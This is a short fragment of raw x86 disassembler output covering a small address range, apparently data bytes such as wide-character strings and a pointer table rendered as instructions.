  424513:	add    BYTE PTR [esi],dh
  424515:	add    BYTE PTR [esi+0x0],dl
  424518:	add    BYTE PTR [eax],al
  42451a:	push   ebp
  42451b:	add    BYTE PTR [eax],dh
  42451d:	add    BYTE PTR [eax+eax*1+0x5f],al
  424521:	add    BYTE PTR [edx+0x0],dl
  424524:	dec    ecx
  424525:	add    BYTE PTR [edi+0x0],cl
  424528:	xor    eax,DWORD PTR [eax]
  42452a:	xor    eax,0x34005f00
  42452f:	add    BYTE PTR [edi+0x0],cl
  424532:	pop    ecx
  424533:	add    BYTE PTR [eax],al
  424535:	add    BYTE PTR [eax+eax*1+0x31],cl
  424539:	add    BYTE PTR [esi+0x0],al
  42453c:	pop    edi
  42453d:	add    BYTE PTR [ebp+0x0],cl
  424540:	dec    ebp
  424541:	add    BYTE PTR [eax],bh
  424543:	add    BYTE PTR [esi],dh
  424545:	add    BYTE PTR [edx+0x0],al
  424548:	dec    esp
  424549:	add    BYTE PTR [eax],al
  42454b:	add    BYTE PTR [edx+0x0],al
  42454e:	xor    eax,0x5f003500
  424553:	add    BYTE PTR [eax+0x0],bl
  424556:	inc    esp
  424557:	add    BYTE PTR [edi+0x0],cl
  42455a:	inc    ecx
  42455b:	add    BYTE PTR [eax+eax*1],dh
  42455e:	add    BYTE PTR [eax],al
  424560:	push   ecx
  424561:	add    BYTE PTR [eax],bh
  424563:	add    BYTE PTR [ecx+0x0],dl
  424566:	pop    edi
  424567:	add    BYTE PTR [eax+eax*1+0x31],dl
  42456b:	add    BYTE PTR [ecx],dh
  42456d:	add    BYTE PTR [eax],bh
  42456f:	add    BYTE PTR [edi+0x0],bl
  424572:	aaa    
  424573:	add    BYTE PTR [edx+0x0],al
  424576:	add    BYTE PTR [eax],al
  424578:	push   edx
  424579:	add    BYTE PTR [ecx],bh
  42457b:	add    BYTE PTR [esi+0x0],dl
  42457e:	pop    edi
  42457f:	add    BYTE PTR [eax+eax*1],dh
  424582:	push   edx
  424583:	add    BYTE PTR [ecx+0x0],bl
  424586:	pop    edi
  424587:	add    BYTE PTR [eax],bh
  424589:	add    BYTE PTR [eax],dh
  42458b:	add    BYTE PTR [edx+0x0],bl
  42458e:	add    BYTE PTR [eax],al
  424590:	add    BYTE PTR [eax],al
  424592:	nop
  424593:	inc    edx
  424594:	add    BYTE PTR [eax+edx*4],al
  424597:	inc    edx
  424598:	add    BYTE PTR [eax],cl
  42459a:	nop
  42459b:	inc    edx
  42459c:	add    BYTE PTR [eax+edx*4],cl
  42459f:	inc    edx
  4245a0:	add    BYTE PTR [eax],dl
  4245a2:	nop
  4245a3:	inc    edx
  4245a4:	add    BYTE PTR [eax+edx*4],dl
  4245a7:	inc    edx
  4245a8:	add    BYTE PTR [eax],bl
  4245aa:	nop
  4245ab:	inc    edx
  4245ac:	add    BYTE PTR [eax+edx*4],bl
  4245af:	inc    edx
  4245b0:	add    BYTE PTR [eax],ah
  4245b2:	nop
  4245b3:	inc    edx
  4245b4:	add    BYTE PTR [eax+edx*4],ah
  4245b7:	inc    edx
  4245b8:	add    BYTE PTR [eax],ch
  4245ba:	nop
  4245bb:	inc    edx
	...
